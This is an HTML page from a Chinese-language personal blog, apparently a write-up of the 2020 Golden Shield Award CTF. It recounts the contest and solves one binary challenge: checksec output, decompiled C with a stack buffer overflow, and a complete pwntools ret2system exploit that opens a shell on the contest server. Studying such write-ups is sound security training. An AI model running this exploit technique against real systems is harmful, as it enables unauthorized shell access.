@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wh00am1.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="心得寫在前">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020年金盾獎">
+<meta property="og:url" content="https://wh00am1.github.io/2020/12/17/Golden-Shield-Final/index.html">
+<meta property="og:site_name" content="wh00am1&#39;s Notes">
+<meta property="og:description" content="心得寫在前">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-12-17T13:03:22.000Z">
+<meta property="article:modified_time" content="2023-11-05T08:35:58.713Z">
+<meta property="article:author" content="wh00am1">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="comps">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://wh00am1.github.io/2020/12/17/Golden-Shield-Final/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>2020年金盾獎 | wh00am1's Notes</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">wh00am1's Notes</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://wh00am1.github.io/2020/12/17/Golden-Shield-Final/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wh00am1">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wh00am1's Notes">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2020年金盾獎
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-12-17 21:03:22" itemprop="dateCreated datePublished" datetime="2020-12-17T21:03:22+08:00">2020-12-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-11-05 16:35:58" itemprop="dateModified" datetime="2023-11-05T16:35:58+08:00">2023-11-05</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="心得寫在前"><a href="#心得寫在前" class="headerlink" title="心得寫在前"></a>心得寫在前</h2><span id="more"></span>
+<h3 id="10-17-初賽"><a href="#10-17-初賽" class="headerlink" title="10&#x2F;17 初賽"></a>10&#x2F;17 初賽</h3><p>這是我第一次參加金盾獎</p>
+<p>初賽的題目總共是四題，競賽時間是兩小時，然後我想抱怨一下:</p>
+<p>官網寫包含很多類別，其中有Misc, 但其實每題都是Misc&#x3D; &#x3D; (+forensics)</p>
+<p>然後工作人員好像自己也不太懂(?)，好這不重要，反正題目幾乎都是鑑識，我不會QQ</p>
+<p>只解了第一題就進決賽xD</p>
+<h3 id="10-20-決賽"><a href="#10-20-決賽" class="headerlink" title="10&#x2F;20 決賽"></a>10&#x2F;20 決賽</h3><p>其實當初沒有想到會進決賽，想當然爾，我們是墊底進的Orz</p>
+<p>今年的題目有所謂的 “教學題”，就是直接提供解法，但會扣分(400 -&gt; 100)</p>
+<p>似乎是怕有人會掛蛋嘛XDDDD</p>
+<p>賽中出題者好像不太懂分類(?)，把Web出到Pwn去，然後Reverse &#x3D; Pwn</p>
+<p>最後我們燒雞，我解出一題(唯一的)PWN(假Reverse)，然後隊友開了Crypto_教學題的題示</p>
+<p>然後就拿到第三了XDD，直接拿一萬回家</p>
+<h3 id="決賽"><a href="#決賽" class="headerlink" title="決賽"></a>決賽</h3><p>這次我唯一解出的題目是 Reverse_教學題</p>
+<p>雖說是reverse啦，但看題敘可以明顯看出是有關Buffer Overflow，我引用一小段:</p>
+<p><code>…小明發現輸入過長的資料會導致 Segmentation Fault…</code><br>看到這邊大概就有底了，然後再打開Binary:</p>
+<h4 id="保護機制"><a href="#保護機制" class="headerlink" title="保護機制"></a>保護機制</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>開了NX, 沒開Canary，很明顯是要stack overflow，接著看組語:</p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h4><p><code>main()</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  checkInfo();</span><br><span class="line">  system(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>呼叫了<code>checkInfo()</code>, 接著就exit，注意這邊用了<code>system()</code></p>
+<p><code>checkInfo()</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">checkInfo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> password[<span class="number">10</span>]; <span class="comment">// [esp+16h] [ebp-412h]</span></span><br><span class="line">  <span class="type">char</span> account[<span class="number">1024</span>]; <span class="comment">// [esp+20h] [ebp-408h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(account, <span class="number">0</span>, <span class="keyword">sizeof</span>(account));</span><br><span class="line">  *(_DWORD *)password = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;password[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_WORD *)&amp;password[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input account: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  fgets(account, <span class="number">10240</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(account, <span class="number">64</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;account is : &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">printf</span>(account);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;account failed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input password: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  fgets(password, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(password, <span class="string">&quot;123456&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;password is : &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">printf</span>(password);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;password failed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>這邊可以看到<code>password[10], account[1024]</code>，但<code>fgets()</code>讀了10240，明顯的buffer overflow</p>
+<p>指向<code>system@plt</code>，接著布置參數就好</p>
+<h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pwnlib.elf</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./check_passwd&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./check_passwd&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;10.3.202.18&#x27;</span>, <span class="number">6666</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">1036</span></span><br><span class="line">payload += p32(e.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">payload += p32(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">payload += p32(e.search(<span class="string">&#x27;sh&#x27;</span>).<span class="built_in">next</span>())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"><span class="comment">#p.sendline(&#x27;A&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/comps/" rel="tag"># comps</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2023/10/17/Writeup-hackme-inndy-tw/" rel="next" title="Writeup::hackme.inndy.tw">
+      Writeup::hackme.inndy.tw <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BF%83%E5%BE%97%E5%AF%AB%E5%9C%A8%E5%89%8D"><span class="nav-number">1.</span> <span class="nav-text">心得寫在前</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#10-17-%E5%88%9D%E8%B3%BD"><span class="nav-number">1.1.</span> <span class="nav-text">10&#x2F;17 初賽</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-20-%E6%B1%BA%E8%B3%BD"><span class="nav-number">1.2.</span> <span class="nav-text">10&#x2F;20 決賽</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B1%BA%E8%B3%BD"><span class="nav-number">1.3.</span> <span class="nav-text">決賽</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%9D%E8%AD%B7%E6%A9%9F%E5%88%B6"><span class="nav-number">1.3.1.</span> <span class="nav-text">保護機制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.3.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exploit"><span class="nav-number">1.3.3.</span> <span class="nav-text">exploit</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">wh00am1</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wh00am1</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
